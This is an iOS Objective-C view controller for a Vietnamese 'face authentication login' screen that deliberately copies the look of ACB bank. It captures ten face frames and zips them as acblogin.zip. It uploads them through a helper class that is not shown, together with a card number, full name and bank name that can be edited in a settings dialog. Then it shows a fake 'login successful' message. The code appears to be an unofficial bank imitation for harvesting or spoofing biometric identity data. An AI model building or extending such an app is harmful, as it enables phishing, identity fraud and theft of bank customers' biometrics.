#import "ViewController.h"
#import "ZipManager.h"

@interface ViewController ()
@property (nonatomic, strong) CameraManager *cameraManager;
@property (nonatomic, strong) ACBUploader *uploader;

// UI Elements
@property (nonatomic, strong) UIView *cameraContainerView;
@property (nonatomic, strong) UIView *overlayView;
@property (nonatomic, strong) CAShapeLayer *maskLayer;
@property (nonatomic, strong) CAShapeLayer *borderLayer;
@property (nonatomic, strong) CAShapeLayer *scanArcLayer1;
@property (nonatomic, strong) CAShapeLayer *scanArcLayer2;

@property (nonatomic, strong) UILabel *titleLabel;
@property (nonatomic, strong) UILabel *instructionLabel;
@property (nonatomic, strong) UILabel *stageCounterLabel;
@property (nonatomic, strong) UILabel *faceQualityBadge;
@property (nonatomic, strong) UIButton *resetButton;
@property (nonatomic, strong) UIButton *configButton;

// Upload UI
@property (nonatomic, strong) UIView *uploadDialog;
@property (nonatomic, strong) UIProgressView *progressBar;
@property (nonatomic, strong) UILabel *uploadStatusLabel;

// Configs
@property (nonatomic, strong) NSString *userName;
@property (nonatomic, strong) NSString *bankType;

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    
    if (!self.cardNumber || self.cardNumber.length == 0) {
        self.cardNumber = @"18601771";
    }
    self.userName = @"NGUYEN VAN A";
    self.bankType = @"ACB";
    
    [self setupCamera];
    [self setupOverlayUI];
    [self setupControls];
    [self setupUploadDialog];
    
    self.uploader = [[ACBUploader alloc] init];
    self.uploader.delegate = self;
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    [self.cameraManager requestPermissionAndStart];
}

- (void)viewDidLayoutSubviews {
    [super viewDidLayoutSubviews];
    self.cameraManager.previewLayer.frame = self.view.bounds;
    [self updateOvalPaths];
    [self startScanArcsAnimation];
}

- (void)setupCamera {
    self.cameraContainerView = [[UIView alloc] initWithFrame:self.view.bounds];
    [self.view addSubview:self.cameraContainerView];
    
    self.cameraManager = [[CameraManager alloc] init];
    self.cameraManager.delegate = self;
    [self.cameraContainerView.layer addSublayer:self.cameraManager.previewLayer];
}

- (void)setupOverlayUI {
    self.overlayView = [[UIView alloc] initWithFrame:self.view.bounds];
    self.overlayView.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.60];
    self.overlayView.userInteractionEnabled = NO;
    [self.view addSubview:self.overlayView];
    
    // Mask layer
    self.maskLayer = [CAShapeLayer layer];
    self.maskLayer.fillRule = kCAFillRuleEvenOdd;
    self.overlayView.layer.mask = self.maskLayer;
    
    // Border layer
    self.borderLayer = [CAShapeLayer layer];
    self.borderLayer.strokeColor = [UIColor colorWithWhite:0.75 alpha:1.0].CGColor;
    self.borderLayer.fillColor = [UIColor clearColor].CGColor;
    self.borderLayer.lineWidth = 4.0;
    [self.view.layer addSublayer:self.borderLayer];
    
    // Scan Arcs (vong radar xoay quanh oval giong ACB)
    self.scanArcLayer1 = [CAShapeLayer layer];
    self.scanArcLayer1.strokeColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0].CGColor;
    self.scanArcLayer1.fillColor = [UIColor clearColor].CGColor;
    self.scanArcLayer1.lineWidth = 5.0;
    self.scanArcLayer1.lineCap = kCALineCapRound;
    [self.view.layer addSublayer:self.scanArcLayer1];
    
    self.scanArcLayer2 = [CAShapeLayer layer];
    self.scanArcLayer2.strokeColor = [UIColor colorWithRed:0.1 green:0.85 blue:0.4 alpha:1.0].CGColor;
    self.scanArcLayer2.fillColor = [UIColor clearColor].CGColor;
    self.scanArcLayer2.lineWidth = 5.0;
    self.scanArcLayer2.lineCap = kCALineCapRound;
    [self.view.layer addSublayer:self.scanArcLayer2];
    
    // Title
    self.titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 52, self.view.bounds.size.width - 40, 28)];
    self.titleLabel.text = @"Xác thực khuôn mặt Đăng nhập";
    self.titleLabel.textColor = [UIColor whiteColor];
    self.titleLabel.font = [UIFont boldSystemFontOfSize:19];
    self.titleLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.titleLabel];
    
    // Instruction label
    self.instructionLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 84, self.view.bounds.size.width - 40, 44)];
    self.instructionLabel.text = @"Vui lòng đưa khuôn mặt vào trong khung hình";
    self.instructionLabel.textColor = [UIColor colorWithWhite:0.95 alpha:1.0];
    self.instructionLabel.font = [UIFont systemFontOfSize:15];
    self.instructionLabel.textAlignment = NSTextAlignmentCenter;
    self.instructionLabel.numberOfLines = 2;
    [self.view addSubview:self.instructionLabel];
    
    // Quality badge
    self.faceQualityBadge = [[UILabel alloc] initWithFrame:CGRectMake((self.view.bounds.size.width - 260) / 2.0, 134, 260, 30)];
    self.faceQualityBadge.text = @"Đang quét khuôn mặt...";
    self.faceQualityBadge.textColor = [UIColor whiteColor];
    self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.85];
    self.faceQualityBadge.font = [UIFont boldSystemFontOfSize:13];
    self.faceQualityBadge.textAlignment = NSTextAlignmentCenter;
    self.faceQualityBadge.layer.cornerRadius = 15;
    self.faceQualityBadge.layer.masksToBounds = YES;
    [self.view addSubview:self.faceQualityBadge];
    
    // Stage counter label
    self.stageCounterLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, self.view.bounds.size.height - 180, self.view.bounds.size.width - 40, 26)];
    self.stageCounterLabel.text = @"Tiến trình: 0/10 frames";
    self.stageCounterLabel.textColor = [UIColor colorWithRed:0.09 green:0.55 blue:0.98 alpha:1.0];
    self.stageCounterLabel.font = [UIFont boldSystemFontOfSize:17];
    self.stageCounterLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:self.stageCounterLabel];
}

- (void)updateOvalPaths {
    CGFloat screenW = self.view.bounds.size.width;
    CGFloat screenH = self.view.bounds.size.height;
    
    CGFloat ovalW = screenW * 0.76;
    CGFloat ovalH = ovalW * 1.34;
    CGFloat ovalX = (screenW - ovalW) / 2.0;
    CGFloat ovalY = (screenH - ovalH) / 2.0 - 15.0;
    CGRect ovalRect = CGRectMake(ovalX, ovalY, ovalW, ovalH);
    
    self.cameraManager.ovalRect = ovalRect;
    
    UIBezierPath *path = [UIBezierPath bezierPathWithRect:self.view.bounds];
    UIBezierPath *ovalPath = [UIBezierPath bezierPathWithOvalInRect:ovalRect];
    [path appendPath:ovalPath];
    
    self.maskLayer.path = path.CGPath;
    self.borderLayer.path = ovalPath.CGPath;
    
    UIBezierPath *arc1 = [UIBezierPath bezierPathWithArcCenter:CGPointMake(CGRectGetMidX(ovalRect), CGRectGetMidY(ovalRect))
                                                        radius:ovalW / 2.0 + 3.0
                                                    startAngle:0
                                                      endAngle:M_PI_2
                                                     clockwise:YES];
    self.scanArcLayer1.path = arc1.CGPath;
    
    UIBezierPath *arc2 = [UIBezierPath bezierPathWithArcCenter:CGPointMake(CGRectGetMidX(ovalRect), CGRectGetMidY(ovalRect))
                                                        radius:ovalW / 2.0 + 3.0
                                                    startAngle:M_PI
                                                      endAngle:M_PI + M_PI_2
                                                     clockwise:YES];
    self.scanArcLayer2.path = arc2.CGPath;
}

- (void)startScanArcsAnimation {
    CABasicAnimation *rotation = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
    rotation.toValue = @(M_PI * 2.0);
    rotation.duration = 2.2;
    rotation.cumulative = YES;
    rotation.repeatCount = HUGE_VALF;
    
    CGPoint center = CGPointMake(self.view.bounds.size.width / 2.0, self.view.bounds.size.height / 2.0 - 15.0);
    self.scanArcLayer1.position = center;
    self.scanArcLayer1.bounds = CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height);
    [self.scanArcLayer1 addAnimation:rotation forKey:@"rotation"];
    
    self.scanArcLayer2.position = center;
    self.scanArcLayer2.bounds = CGRectMake(0, 0, self.view.bounds.size.width, self.view.bounds.size.height);
    [self.scanArcLayer2 addAnimation:rotation forKey:@"rotation"];
}

- (void)setupControls {
    CGFloat screenW = self.view.bounds.size.width;
    CGFloat screenH = self.view.bounds.size.height;
    
    // Nut Quay lai (Back to Card Input)
    UIButton *backBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    backBtn.frame = CGRectMake(16, 52, 70, 30);
    [backBtn setTitle:@"‹ Đổi thẻ" forState:UIControlStateNormal];
    [backBtn setTitleColor:[UIColor colorWithRed:0.4 green:0.7 blue:1.0 alpha:1.0] forState:UIControlStateNormal];
    backBtn.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
    [backBtn addTarget:self action:@selector(onBackTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:backBtn];
    
    // Nut Quet Lai (Reset)
    self.resetButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.resetButton.frame = CGRectMake((screenW - 180) / 2.0, screenH - 110, 180, 44);
    self.resetButton.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.8];
    [self.resetButton setTitle:@"QUÉT LẠI" forState:UIControlStateNormal];
    [self.resetButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    self.resetButton.titleLabel.font = [UIFont boldSystemFontOfSize:15];
    self.resetButton.layer.cornerRadius = 22;
    [self.resetButton addTarget:self action:@selector(onResetTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.resetButton];
    
    // Nut Cau Hinh
    self.configButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.configButton.frame = CGRectMake(screenW - 80, 52, 60, 30);
    [self.configButton setTitle:@"Cài đặt" forState:UIControlStateNormal];
    [self.configButton setTitleColor:[UIColor colorWithRed:0.4 green:0.7 blue:1.0 alpha:1.0] forState:UIControlStateNormal];
    self.configButton.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
    [self.configButton addTarget:self action:@selector(onConfigTapped) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:self.configButton];
}

- (void)setupUploadDialog {
    self.uploadDialog = [[UIView alloc] initWithFrame:CGRectMake(30, (self.view.bounds.size.height - 160) / 2.0, self.view.bounds.size.width - 60, 160)];
    self.uploadDialog.backgroundColor = [UIColor colorWithWhite:0.12 alpha:0.96];
    self.uploadDialog.layer.cornerRadius = 16;
    self.uploadDialog.layer.borderWidth = 1.0;
    self.uploadDialog.layer.borderColor = [UIColor colorWithWhite:0.35 alpha:1.0].CGColor;
    self.uploadDialog.hidden = YES;
    [self.view addSubview:self.uploadDialog];
    
    UILabel *dialogTitle = [[UILabel alloc] initWithFrame:CGRectMake(16, 20, self.uploadDialog.bounds.size.width - 32, 24)];
    dialogTitle.text = @"Đang gửi dữ liệu đăng nhập...";
    dialogTitle.textColor = [UIColor whiteColor];
    dialogTitle.font = [UIFont boldSystemFontOfSize:16];
    dialogTitle.textAlignment = NSTextAlignmentCenter;
    [self.uploadDialog addSubview:dialogTitle];
    
    self.progressBar = [[UIProgressView alloc] initWithProgressViewStyle:UIProgressViewStyleDefault];
    self.progressBar.frame = CGRectMake(24, 70, self.uploadDialog.bounds.size.width - 48, 8);
    self.progressBar.progressTintColor = [UIColor colorWithRed:0.09 green:0.50 blue:0.95 alpha:1.0];
    self.progressBar.trackTintColor = [UIColor colorWithWhite:0.3 alpha:1.0];
    [self.uploadDialog addSubview:self.progressBar];
    
    self.uploadStatusLabel = [[UILabel alloc] initWithFrame:CGRectMake(16, 100, self.uploadDialog.bounds.size.width - 32, 24)];
    self.uploadStatusLabel.text = @"Chuẩn bị gửi dữ liệu...";
    self.uploadStatusLabel.textColor = [UIColor colorWithWhite:0.8 alpha:1.0];
    self.uploadStatusLabel.font = [UIFont systemFontOfSize:13];
    self.uploadStatusLabel.textAlignment = NSTextAlignmentCenter;
    [self.uploadDialog addSubview:self.uploadStatusLabel];
}

#pragma mark - Actions

- (void)onBackTapped {
    [self.cameraManager stopSession];
    [self dismissViewControllerAnimated:YES completion:nil];
}

- (void)onResetTapped {
    [self.cameraManager resetCapture];
    self.instructionLabel.text = @"Vui lòng đưa khuôn mặt vào trong khung hình";
    self.stageCounterLabel.text = @"Tiến trình: 0/10 frames";
    self.borderLayer.strokeColor = [UIColor colorWithWhite:0.75 alpha:1.0].CGColor;
    self.faceQualityBadge.text = @"Đang quét khuôn mặt...";
    self.faceQualityBadge.backgroundColor = [UIColor colorWithWhite:0.25 alpha:0.85];
}

- (void)onConfigTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Cấu hình Đăng nhập" message:@"Thông tin gửi kèm multipart:" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Số thẻ / Tài khoản"; t.text = self.cardNumber; }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Họ và tên"; t.text = self.userName; }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *t) { t.placeholder = @"Ngân hàng"; t.text = self.bankType; }];
    
    [alert addAction:[UIAlertAction actionWithTitle:@"Lưu" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        self.cardNumber = alert.textFields[0].text;
        self.userName = alert.textFields[1].text;
        self.bankType = alert.textFields[2].text;
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"Hủy" style:UIAlertActionStyleCancel handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

#pragma mark - CameraManagerDelegate

- (void)cameraManagerPermissionDenied {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Cần quyền Camera"
                                                                   message:@"Vui lòng cho phép quyền Camera trong Cài đặt iPhone để xác thực khuôn mặt."
                                                            preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)cameraManagerDidUpdateFaceStatus:(ACBFaceStatus)status message:(NSString *)message faceBounds:(CGRect)screenRect {
    self.instructionLabel.text = message;
    self.faceQualityBadge.text = message;
    
    switch (status) {
        case ACBFaceStatusFaceOK:
            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.0 green:0.80 blue:0.35 alpha:0.95];
            self.borderLayer.strokeColor = [UIColor colorWithRed:0.0 green:0.88 blue:0.4 alpha:1.0].CGColor;
            break;
            
        case ACBFaceStatusTooFar:
        case ACBFaceStatusTooClose:
            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.1 green:0.50 blue:0.85 alpha:0.85];
            self.borderLayer.strokeColor = [UIColor colorWithRed:0.1 green:0.55 blue:0.95 alpha:1.0].CGColor;
            break;
            
        case ACBFaceStatusNotCentered:
        case ACBFaceStatusHeadTilted:
        case ACBFaceStatusEyesClosed:
        case ACBFaceStatusSmiling:
            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.85 green:0.55 blue:0.1 alpha:0.85];
            self.borderLayer.strokeColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0].CGColor;
            break;
            
        case ACBFaceStatusNoFace:
        case ACBFaceStatusMultipleFaces:
        default:
            self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.85 green:0.25 blue:0.25 alpha:0.90];
            self.borderLayer.strokeColor = [UIColor colorWithRed:0.85 green:0.30 blue:0.30 alpha:1.0].CGColor;
            break;
    }
}

- (void)cameraManagerDidStartCapturing {
    self.faceQualityBadge.text = @"Đang thu thập… 0 / 10 khung hình đạt yêu cầu";
    self.faceQualityBadge.backgroundColor = [UIColor colorWithRed:0.0 green:0.80 blue:0.35 alpha:0.95];
    self.borderLayer.strokeColor = [UIColor colorWithRed:0.0 green:0.88 blue:0.4 alpha:1.0].CGColor;
    self.stageCounterLabel.text = @"Đang thu thập… 0 / 10";
}

- (void)cameraManagerDidCaptureFrame:(UIImage *)image index:(NSInteger)index total:(NSInteger)total {
    self.faceQualityBadge.text = [NSString stringWithFormat:@"Đang thu thập… %ld / %ld khung hình đạt yêu cầu", (long)index, (long)total];
    self.stageCounterLabel.text = [NSString stringWithFormat:@"Đã chụp %ld/%ld ảnh", (long)index, (long)total];
}

- (void)cameraManagerDidFinishCaptureWithFolder:(NSString *)folderPath {
    self.instructionLabel.text = @"Đã chụp đủ 10 ảnh! Đang đóng gói acblogin.zip...";
    self.stageCounterLabel.text = @"Đang gửi dữ liệu...";
    self.faceQualityBadge.text = @"Hoàn tất chụp";
    
    NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"acblogin.zip"];
    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:nil];
    
    BOOL zipOk = [ZipManager createZipArchiveAtPath:zipPath fromSourceFolder:folderPath error:nil];
    if (!zipOk) {
        self.instructionLabel.text = @"Lỗi đóng gói zip!";
        return;
    }
    
    self.uploadDialog.hidden = NO;
    self.progressBar.progress = 0.0;
    self.uploadStatusLabel.text = @"Đang gửi dữ liệu đăng nhập...";
    
    // Upload fileName = "acblogin.zip"
    [self.uploader uploadZipFile:zipPath fileName:@"acblogin.zip" card:self.cardNumber name:self.userName bankType:self.bankType];
}

#pragma mark - ACBUploaderDelegate

- (void)uploaderDidProgress:(float)progress currentChunk:(NSInteger)current totalChunks:(NSInteger)total {
    self.progressBar.progress = progress;
    self.uploadStatusLabel.text = [NSString stringWithFormat:@"Đang tải: %ld/%ld chunks (%.0f%%)", (long)current, (long)total, progress * 100.0];
}

- (void)uploaderDidFinishSuccessWithResponse:(NSDictionary *)response {
    self.uploadDialog.hidden = YES;
    self.instructionLabel.text = @"Đăng nhập thành công!";
    self.stageCounterLabel.text = @"Xác thực hoàn tất 100%";
    
    NSString *fileId = response[@"data"][@"fileInfo"][@"fileId"] ?: @"OK";
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Đăng Nhập Thành Công"
                                                                   message:[NSString stringWithFormat:@"Server đã xác thực khuôn mặt thành công!\nFile ID: %@", fileId]
                                                            preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"Đóng" style:UIAlertActionStyleDefault handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)uploaderDidFailWithError:(NSString *)errorMessage {
    self.uploadDialog.hidden = YES;
    self.instructionLabel.text = @"Lỗi khi gửi dữ liệu!";
    
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Lỗi Đăng Nhập"
                                                                    message:errorMessage
                                                             preferredStyle:UIAlertControllerStyleAlert];
    [alert addAction:[UIAlertAction actionWithTitle:@"Thử lại" style:UIAlertActionStyleCancel handler:nil]];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
